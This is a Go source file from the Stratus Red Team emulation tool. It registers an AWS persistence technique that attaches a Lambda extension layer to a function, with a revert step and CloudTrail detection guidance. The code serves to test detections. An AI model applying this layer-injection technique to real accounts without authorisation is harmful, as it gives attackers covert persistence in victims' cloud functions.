package aws

import (
	"context"
	_ "embed"
	"errors"
	"log"

	"github.com/aws/aws-sdk-go-v2/aws"
	"github.com/aws/aws-sdk-go-v2/service/lambda"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus/mitreattack"
)

//go:embed main.tf
var tf []byte

func init() {
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:           "aws.persistence.lambda-layer-extension",
		FriendlyName: "Add a Malicious Lambda Extension",
		Description: `
Establishes persistence by adding a malicious lambda extension.

Warm-up: 

- Create a Lambda function and a lambda extension (layer).

Detonation: 

- Add the extension as a layer to the Lambda function.

References:

- https://www.clearvector.com/blog/lambda-spy/
`,
		Detection: `
Through CloudTrail's <code>UpdateFunctionConfiguration20150331v2<code> event.

While matching this event may be impractical and prone to false positives in most environments, the following can help to craft more precise detections:
		
Identify a call to <code>UpdateFunctionConfiguration20150331v2<code> where the layers field exists inside responseElements.
		
Identify a call to <code>UpdateFunctionConfiguration20150331v2<code> where the layers, within responseElements, include a layer that is not from the same account.
`,
		Platform:                   stratus.AWS,
		PrerequisitesTerraformCode: tf,
		IsIdempotent:               true, 
		MitreAttackTactics:         []mitreattack.Tactic{mitreattack.Persistence, mitreattack.PrivilegeEscalation},
		Detonate:                   detonate,
		Revert:                     revert,
	})
}

func detonate(params map[string]string, providers stratus.CloudProviders) error {
	ctx := context.Background()
	lambdaClient := lambda.NewFromConfig(providers.AWS().GetConnection())
	lambdaExtensionLayerArn := params["lambda_extension_layer_arn"]
	lambdaArn := params["lambda_arn"]

	var layerArns []string
	layerArns = append(layerArns, *aws.String(lambdaExtensionLayerArn))

	// Update the function configuration with our layer
	_, err := lambdaClient.UpdateFunctionConfiguration(ctx, &lambda.UpdateFunctionConfigurationInput{
		FunctionName: aws.String(lambdaArn),
		Layers:       layerArns,
	})

	if err != nil {
		return errors.New("unable to update function configuration: " + err.Error())
	}

	log.Println("Added layer to Lambda function:", lambdaArn)
	return nil
}

func revert(params map[string]string, providers stratus.CloudProviders) error {
	ctx := context.Background()
	lambdaArn := params["lambda_arn"]
	lambdaClient := lambda.NewFromConfig(providers.AWS().GetConnection())

	// Update the function configuration with an empty list of layers
	_, err := lambdaClient.UpdateFunctionConfiguration(ctx, &lambda.UpdateFunctionConfigurationInput{
		FunctionName: aws.String(lambdaArn),
		Layers:       []string{},
	})
	
	if err != nil {
		return errors.New("unable to update function configuration: " + err.Error())
	}
	log.Printf("Layers have been removed from Lambda function: %s\n", lambdaArn)
	return nil
}